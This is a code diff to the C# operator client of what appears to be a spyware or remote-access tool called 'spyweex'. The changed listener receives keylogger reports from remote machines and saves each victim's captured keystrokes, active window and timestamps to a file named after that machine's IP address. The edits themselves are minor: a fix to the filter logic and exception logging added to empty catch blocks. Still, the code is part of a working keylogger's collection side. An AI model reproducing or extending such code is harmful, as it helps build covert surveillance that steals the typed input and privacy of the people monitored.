@@ -21,8 +21,15 @@ namespace spyweex_client_wpf.Subscribers
                 getObservableSequenceOfReponses().
                 ObserveOn(Scheduler.CurrentThread).
                 SkipWhile(
-                response => response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_REPORT) &&
-                response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_STOP)).
+                    response =>
+                    {
+                        if (response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_REPORT))
+                            return false; // if equals is true then breaks the skipping
+                        else if (response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_STOP))
+                            return false; // if equals is true then breaks the skipping
+                        else return true;
+                    }
+                ).
                 Subscribe(
                 response =>
                 {
@@ -41,7 +48,7 @@ namespace spyweex_client_wpf.Subscribers
                         lines_to_be_inserted_into_file.Add("--------------START TIME--------------");
                         lines_to_be_inserted_into_file.Add(start_time);
                     }
-                    catch (Exception ex) { }
+                    catch (Exception ex) { Debug.WriteLine((Exception)ex); }
 
                     try
                     {
@@ -49,7 +56,7 @@ namespace spyweex_client_wpf.Subscribers
                         lines_to_be_inserted_into_file.Add("---------------END TIME---------------");
                         lines_to_be_inserted_into_file.Add(end_time);
                     }
-                    catch(Exception ex) { }
+                    catch(Exception ex) { Debug.WriteLine((Exception)ex); }
 
                     try
                     {
@@ -57,7 +64,7 @@ namespace spyweex_client_wpf.Subscribers
                         lines_to_be_inserted_into_file.Add("----------LAST ACTIVE WINDOW----------");
                         lines_to_be_inserted_into_file.Add(active_window);
                     }
-                    catch(Exception ex) { }
+                    catch(Exception ex) { Debug.WriteLine((Exception)ex); }
 
                     try
                     {
@@ -65,7 +72,7 @@ namespace spyweex_client_wpf.Subscribers
                         lines_to_be_inserted_into_file.Add("----------------CONTENT----------------");
                         lines_to_be_inserted_into_file.Add(content);
                     }
-                    catch (Exception ex) { }
+                    catch (Exception ex) { Debug.WriteLine((Exception)ex); }
 
                     string path = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString().Split(
                         new string[] {":"}, StringSplitOptions.RemoveEmptyEntries)[0] + "_keylogs.txt";
@@ -74,8 +81,7 @@ namespace spyweex_client_wpf.Subscribers
                 err =>
                 {
                     Debug.WriteLine((Exception)err);
-                    MessageBoxResult result = MessageBox.Show("Error occured in ConnectionInfoListener " + (Exception)err);
-                    UnsubscribeAsync();
+                    MessageBoxResult result = MessageBox.Show("Error occured in KeyloggerListener " + (Exception)err);
                 }
 
            );
